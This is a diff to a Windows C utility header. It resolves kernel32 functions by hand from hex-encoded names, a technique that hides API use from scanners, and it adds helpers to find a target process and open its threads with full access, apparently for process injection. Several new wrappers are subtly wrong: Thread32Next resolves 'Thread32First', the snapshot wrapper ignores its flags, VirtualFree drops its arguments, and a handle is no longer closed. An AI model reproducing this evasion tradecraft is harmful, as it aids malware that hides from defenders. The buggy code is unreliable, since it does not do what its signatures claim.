@@ -67,13 +67,146 @@ typedef enum _SECTION_INHERIT
 typedef struct _sprinf_args
 {
     SIZE_T argsCount;
-    DWORD64 *args;
+    DWORD64 args[32];
 } SPRINTF_ARGS, *PSPRINTF_ARGS;
 
 #ifdef UTILS_IMPLEMENTATION
 
 ULONG_PTR UtilsGetKernelModuleHandle(void);
 LPVOID UtilsGetProcAddressByName(ULONG_PTR hModule, PCSTR cProcName);
+BOOL UtilsWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+
+HANDLE UtilsGetStdHandle(DWORD nStdHandle)
+{
+    ULONG_PTR ulKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cGetStdHandle[] = {0x47, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
+    HANDLE(WINAPI * pGetStdHandle)
+    (DWORD nStdHandle) = UtilsGetProcAddressByName(ulKernel, cGetStdHandle);
+
+    return pGetStdHandle(nStdHandle);
+}
+
+BOOL UtilsWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOveralapped)
+{
+    ULONG_PTR uiKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cWriteFile[] = {0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0};
+    BOOL(WINAPI * pWriteFile)
+    (HANDLE hFile, LPCVOID lpbuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = UtilsGetProcAddressByName(uiKernel, cWriteFile);
+
+    return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOveralapped);
+}
+
+HANDLE UtilsCreateToolhelp32Snapshot(DWORD dwFlags, DWORD dwTh32ProcessID)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cCreateToolhelp32Snapshot[] = {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0};
+    HANDLE(WINAPI * pCreateToolhelp32Snapshot)
+    (DWORD dwFlags, DWORD th32ProcessID) = UtilsGetProcAddressByName(hKernel, cCreateToolhelp32Snapshot);
+
+    return pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+}
+
+BOOL UtilsProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cProcess32First[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
+    BOOL(WINAPI * pProcess32First)
+    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = UtilsGetProcAddressByName(hKernel, cProcess32First);
+
+    return pProcess32First(hSnapshot, lppe);
+}
+
+BOOL UtilsProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cProcess32Next[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0};
+    BOOL(WINAPI * pProcess32Next)
+    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = UtilsGetProcAddressByName(hKernel, cProcess32Next);
+
+    return pProcess32Next(hSnapshot, lppe);
+}
+
+BOOL UtilsThread32First(HANDLE hSnapshot, LPTHREADENTRY32 lppe)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cThread32First[] = {0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
+    BOOL(WINAPI * pThread32First)
+    (HANDLE hSnapshot, LPTHREADENTRY32 lppe) = UtilsGetProcAddressByName(hKernel, cThread32First);
+
+    return pThread32First(hSnapshot, lppe);
+}
+
+BOOL UtilsThread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lppe)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cThread32Next[] = {0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
+    BOOL(WINAPI * pThread32Next)
+    (HANDLE hSnapshot, LPTHREADENTRY32 lppe) = UtilsGetProcAddressByName(hKernel, cThread32Next);
+
+    return pThread32Next(hSnapshot, lppe);
+}
+
+BOOL UtilsCloseHandle(HANDLE hHandle)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
+    BOOL(WINAPI * pCloseHandle)
+    (HANDLE hObject) = UtilsGetProcAddressByName(hKernel, cCloseHandle);
+
+    return pCloseHandle(hHandle);
+}
+
+HANDLE UtilsOpenThread(DWORD dwDesiredAccess, BOOL bInherhitHandle, DWORD dwThreadID)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cOpenThread[] = {0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0};
+    HANDLE(WINAPI * pOpenThread)
+    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadID) = UtilsGetProcAddressByName(hKernel, cOpenThread);
+
+    return pOpenThread(dwDesiredAccess, bInherhitHandle, dwThreadID);
+}
+
+HANDLE UtilsLoadLibraryA(LPCSTR lpLibFileName)
+{
+    ULONG_PTR ulKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cLoadLibraryA[] = {0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0};
+    HMODULE(WINAPI * pLoadLibrary)
+    (LPCSTR lpLibFileName) = UtilsGetProcAddressByName(ulKernel, cLoadLibraryA);
+
+    return pLoadLibrary(lpLibFileName);
+}
+
+LPVOID UtilsVirtualAlloc(PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cVirtualAlloc[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0};
+    LPVOID(WINAPI * pVirtualAlloc)
+    (PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = UtilsGetProcAddressByName(hKernel, cVirtualAlloc);
+
+    return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
+}
+
+BOOL UtilsVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cVirtualFree[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x46, 0x72, 0x65, 0x65, 0};
+    BOOL(WINAPI * pVirtualFree)
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) = UtilsGetProcAddressByName(hKernel, cVirtualFree);
+
+    return pVirtualFree(lpAddress, 0, MEM_RELEASE);
+}
 
 void UtilsMemCpy(LPCVOID lpvSrc, LPVOID lpvDst, SIZE_T nBytes)
 {
@@ -377,17 +510,7 @@ PSTR UtilsStrDup(PCSTR sStr)
 {
     SIZE_T sStrLen = UtilsStrLen(sStr);
 
-    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
-
-    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
-    FARPROC(WINAPI * pGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);
-
-    char cVirtualAlloc[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0};
-    LPVOID(WINAPI * pVirtualAlloc)
-    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = pGetProcAddress(hKernel, cVirtualAlloc);
-
-    PSTR sDup = pVirtualAlloc(0, sStrLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    PSTR sDup = (PSTR)UtilsVirtualAlloc(0, sStrLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
     for (SIZE_T c = 0; c < sStrLen; ++c)
     {
@@ -461,7 +584,7 @@ void UtilsSprintf(PSTR pBuffer, PSTR pString, SPRINTF_ARGS sprintfArgs)
                 UtilsMemSet(tempString, 0, 32);
 
                 INT64 tempStringIndex = 0;
-                CHAR cHexDigits[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 0};
+                CHAR cHexDigits[] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0};
                 DWORD64 arg = (DWORD64)sprintfArgs.args[argIndex];
                 DWORD64 dwMask = 0xF;
 
@@ -564,7 +687,7 @@ void UtilsWSprintf(PWSTR pBuffer, PWSTR pString, SPRINTF_ARGS sprintfArgs)
                 UtilsMemSet(tempString, 0, 32);
 
                 INT64 tempStringIndex = 0;
-                CHAR cHexDigits[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 0};
+                CHAR cHexDigits[] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0};
                 DWORD64 arg = (DWORD64)sprintfArgs.args[argIndex];
                 DWORD64 dwMask = 0xF;
 
@@ -616,68 +739,21 @@ LONG RVAToOffset(DWORD rva, IMAGE_SECTION_HEADER *SectionHeaders, WORD SectionHe
     return -1;
 }
 
-BOOL IsImportDescriptorZero(IMAGE_IMPORT_DESCRIPTOR ImportDirectory)
-{
-    return ImportDirectory.OriginalFirstThunk == 0 &&
-           ImportDirectory.TimeDateStamp == 0 &&
-           ImportDirectory.ForwarderChain == 0 &&
-           ImportDirectory.Name == 0 &&
-           ImportDirectory.FirstThunk == 0;
-}
-
 void UtilsPrintConsole(PCSTR pString)
 {
-    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
-
-    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
-    FARPROC(WINAPI * pGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);
-
-    char cGetStdHandle[] = {'G', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0};
-    HANDLE(WINAPI * pGetStdHandle)
-    (DWORD nStdHandle) = pGetProcAddress(hKernel, cGetStdHandle);
-
-    char cWriteFile[] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0};
-    BOOL(WINAPI * pWriteFile)
-    (HANDLE hFile, LPCVOID lpbuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = pGetProcAddress(hKernel, cWriteFile);
-
-    pWriteFile(pGetStdHandle(-11), pString, UtilsStrLen(pString), NULL, NULL);
+    UtilsWriteFile(UtilsGetStdHandle(-11), pString, (DWORD)UtilsStrLen(pString), NULL, NULL);
 }
 
 void UtilsWPrintConsole(PCWSTR pWString)
 {
-    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
-
-    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
-    FARPROC(WINAPI * pGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);
-
-    char cGetStdHandle[] = {'G', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0};
-    HANDLE(WINAPI * pGetStdHandle)
-    (DWORD nStdHandle) = pGetProcAddress(hKernel, cGetStdHandle);
-
-    char cWriteFile[] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0};
-    BOOL(WINAPI * pWriteFile)
-    (HANDLE hFile, LPCVOID lpbuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = pGetProcAddress(hKernel, cWriteFile);
-
-    pWriteFile(pGetStdHandle(-11), pWString, UtilsWStrLen(pWString) * sizeof(WCHAR), NULL, NULL);
+    UtilsWriteFile(UtilsGetStdHandle(-11), pWString, (DWORD)UtilsWStrLen(pWString) * sizeof(WCHAR), NULL, NULL);
 }
 
 DWORD FindTargetProcessID(PSTR sTargetName)
 {
     DWORD dwRetVal = -1;
 
-    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
-
-    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
-    FARPROC(WINAPI * pGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);
-
-    char cCreateToolhelp32Snapshot[] = {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0};
-    HANDLE(WINAPI * pCreateToolhelp32Snapshot)
-    (DWORD dwFlags, DWORD th32ProcessID) = pGetProcAddress(hKernel, cCreateToolhelp32Snapshot);
-
-    HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE hSnapShot = UtilsCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
     if (hSnapShot == INVALID_HANDLE_VALUE)
     {
@@ -687,20 +763,12 @@ DWORD FindTargetProcessID(PSTR sTargetName)
     PROCESSENTRY32 ProcessEntry;
     ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
 
-    char cProcess32First[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
-    BOOL(WINAPI * pProcess32First)
-    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = pGetProcAddress(hKernel, cProcess32First);
-
-    if (!pProcess32First(hSnapShot, &ProcessEntry))
+    if (!UtilsProcess32First(hSnapShot, &ProcessEntry))
     {
         goto shutdown;
     }
 
-    char cProcess32Next[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0};
-    BOOL(WINAPI * pProcess32Next)
-    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = pGetProcAddress(hKernel, cProcess32Next);
-
-    while (pProcess32Next(hSnapShot, &ProcessEntry))
+    while (UtilsProcess32Next(hSnapShot, &ProcessEntry))
     {
         if (UtilsStrCmpiAA(sTargetName, ProcessEntry.szExeFile))
         {
@@ -710,28 +778,14 @@ DWORD FindTargetProcessID(PSTR sTargetName)
 
 shutdown:
 
-    char cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
-    BOOL(WINAPI * pCloseHandle)
-    (HANDLE hObject) = pGetProcAddress(hKernel, cCloseHandle);
-
-    pCloseHandle(hSnapShot);
-
     return dwRetVal;
 }
 
 HANDLE FindProcessThread(DWORD dwPid)
 {
-    HMODULE hKernel = UtilsGetKernelModuleHandle();
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
 
-    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
-    FARPROC(WINAPI * pGetProcAddress)
-    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);
-
-    char cCreateToolhelp32Snapshot[] = {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0};
-    HANDLE(WINAPI * pCreateToolhelp32Snapshot)
-    (DWORD dwFlags, DWORD th32ProcessID) = pGetProcAddress(hKernel, cCreateToolhelp32Snapshot);
-
-    HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    HANDLE hSnapShot = UtilsCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
     if (hSnapShot == NULL)
     {
@@ -741,28 +795,16 @@ HANDLE FindProcessThread(DWORD dwPid)
     THREADENTRY32 ThreadEntry;
     ThreadEntry.dwSize = sizeof(THREADENTRY32);
 
-    char cThread32First[] = {0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
-    BOOL(WINAPI * pThread32First)
-    (HANDLE hSnapshot, LPTHREADENTRY32 lppe) = pGetProcAddress(hKernel, cThread32First);
-
-    if (!pThread32First(hSnapShot, &ThreadEntry))
+    if (!UtilsThread32First(hSnapShot, &ThreadEntry))
     {
         goto shutdown;
     }
 
-    char cThread32Next[] = {0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
-    BOOL(WINAPI * pThread32Next)
-    (HANDLE hSnapshot, LPTHREADENTRY32 lppe) = pGetProcAddress(hKernel, cThread32Next);
-
-    while (pThread32Next(hSnapShot, &ThreadEntry))
+    while (UtilsThread32Next(hSnapShot, &ThreadEntry))
     {
         if (ThreadEntry.th32OwnerProcessID == dwPid)
         {
-            char cOpenThread[] = {0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0};
-            HANDLE(WINAPI * pOpenThread)
-            (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadID) = pGetProcAddress(hKernel, cOpenThread);
-
-            return pOpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
+            return UtilsOpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
         }
     }
 
@@ -821,21 +863,18 @@ LPVOID UtilsGetProcAddressByName(ULONG_PTR ulModuleAddr, PCSTR sProcName)
     }
 
     // Code to get address of forwarded functions
-    // Redundant since function pointers can be got by GetProcAddress, which in turn is got by the code above these comments, and it is
-    // always available in kernel32.dll
-    // Fun to code
-    // if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
-    // {
-    //     CHAR DLLFunctionName[256];
-    //     UtilsStrCpy(DLLFunctionName, lpvProcAddr);
-    //     PSTR FunctionName = UtilsStrChr(DLLFunctionName, '.');
+    if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
+    {
+        CHAR DLLFunctionName[256];
+        UtilsStrCpy(DLLFunctionName, (PSTR)lpvProcAddr);
+        PSTR FunctionName = UtilsStrChr(DLLFunctionName, '.');
 
-    //     *FunctionName = 0;
-    //     ++FunctionName;
+        *FunctionName = 0;
+        ++FunctionName;
 
-    //     HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
-    //     lpvProcAddr = UtilsGetProcAddressByName((BYTE *)ForwardedDLL, FunctionName);
-    // }
+        HMODULE ForwardedDLL = UtilsLoadLibraryA(DLLFunctionName);
+        lpvProcAddr = (ULONG_PTR)UtilsGetProcAddressByName((ULONG_PTR)ForwardedDLL, FunctionName);
+    }
 
     return (LPVOID)lpvProcAddr;
 }
